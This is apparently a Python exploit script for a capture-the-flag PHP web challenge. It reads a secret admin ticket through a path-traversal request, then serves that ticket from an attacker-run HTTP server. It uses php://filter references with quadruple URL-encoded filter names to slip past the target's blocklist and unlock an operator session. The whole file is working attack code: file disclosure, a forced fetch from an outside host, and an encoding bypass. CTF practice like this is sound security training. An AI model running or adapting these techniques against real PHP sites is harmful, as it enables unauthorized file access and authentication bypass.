#!/usr/bin/env python3
from __future__ import annotations

import argparse
import http.server
import re
import socketserver
import threading
import time
import zlib
from urllib.parse import urljoin

import requests

def clean_html(text: str) -> str:
    text = re.sub(r"<[^>]+>", " ", text)
    text = re.sub(r"\s+", " ", text)
    return text.strip()

class ThreadingHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True

class Handler(http.server.BaseHTTPRequestHandler):
    ROUTES: dict[str, bytes] = {}

    def do_GET(self):
        data = self.ROUTES.get(self.path)
        print(f"[server] GET {self.path} from {self.client_address[0]}", flush=True)
        if data is None:
            self.send_response(404)
            self.send_header("Content-Length", "9")
            self.end_headers()
            self.wfile.write(b"not found")
            return
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, fmt, *args):
        pass

class Client:
    def __init__(self, base: str):
        self.base = base.rstrip("/") + "/"
        self.s = requests.Session()

    def get(self, path: str, **kw):
        return self.s.get(urljoin(self.base, path.lstrip("/")), timeout=20, allow_redirects=True, **kw)

    def post_import_raw(self, ref: str) -> str:
        body = "ticket_ref=" + ref
        r = self.s.post(
            urljoin(self.base, "/dashboard/integrations/import-reference"),
            data=body,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=20,
            allow_redirects=True,
        )
        return clean_html(r.text)

    def lfi(self, path: str) -> bytes:
        return self.get("/reports/download", params={"file": "../../../../" + path.lstrip("/")}).content

    def dashboard(self) -> str:
        return clean_html(self.get("/dashboard").text)

def raw_deflate(data: bytes) -> bytes:
    return zlib.compress(data, 9)[2:-4]

def dechunk_body(data: bytes) -> bytes:
    return f"{len(data):X}\r\n".encode() + data + b"\r\n0\r\n\r\n"

def encode_token_for_filter_runtime(token: str) -> str:
    """
    Need:
      - x-www-form-urlencoded decode once in PHP request parsing
      - blockedReference() rawurldecode() twice
      - php://filter parser decode once more at runtime

    So raw POST body needs 4 total encodings of the first byte escape.
    Example:
      dechunk -> %25252564echunk in raw body
      zlib.inflate -> %2525257alib.inflate in raw body
    """
    if token == "dechunk":
        return "%25252564echunk"
    if token == "zlib.inflate":
        return "%2525257alib.inflate"
    raise ValueError(token)

def is_unlocked(import_text: str, dash_text: str) -> bool:
    return (
        "Operator workspace enabled for this session." in import_text
        or "Operator workspace is active for this browser session." in dash_text
    )

def main() -> int:
    ap = argparse.ArgumentParser(description="Corrected FunPHP HTTP/filter probe")
    ap.add_argument("target", help="Challenge base URL")
    ap.add_argument("--advertise-url", required=True, help="URL the target should fetch, e.g. http://172.17.0.1:9000")
    ap.add_argument("--listen-host", default="0.0.0.0")
    ap.add_argument("--listen-port", type=int, default=9000)
    ap.add_argument("--no-serve", action="store_true")
    args = ap.parse_args()

    c = Client(args.target)
    ticket = c.lfi("/var/www/secrets/admin_ticket.txt")
    print(f"[+] leaked ticket={ticket!r} len={len(ticket)}")
    if len(ticket) != 12:
        return 2

    routes = {
        "/plain": ticket,
        "/chunked": dechunk_body(ticket),
        "/deflate": raw_deflate(ticket),
        "/junk": b"NOT_THE_TICKET",
    }

    server = None
    if not args.no_serve:
        Handler.ROUTES = routes
        server = ThreadingHTTPServer((args.listen_host, args.listen_port), Handler)
        th = threading.Thread(target=server.serve_forever, daemon=True)
        th.start()
        time.sleep(0.2)
        print(f"[+] serving on http://{args.listen_host}:{args.listen_port}")

    base = args.advertise_url.rstrip("/")
    cases = [
        ("plain_http", f"{base}/plain"),
        ("dechunk_http_4enc", f"php://filter/read={encode_token_for_filter_runtime('dechunk')}/resource={base}/chunked"),
        ("zlib_http_4enc", f"php://filter/read={encode_token_for_filter_runtime('zlib.inflate')}/resource={base}/deflate"),
        ("plain_junk_http", f"{base}/junk"),
    ]

    for name, ref in cases:
        print(f"\n=== {name} ===")
        print(f"[ref] {ref}")
        import_text = c.post_import_raw(ref)
        dash = c.dashboard()
        print(f"[import] {import_text[:280]}")
        print(f"[dash]   {dash[:280]}")
        print(f"[unlocked] {is_unlocked(import_text, dash)}")

    if server is not None:
        server.shutdown()
        server.server_close()

    return 0

if __name__ == "__main__":
    raise SystemExit(main())
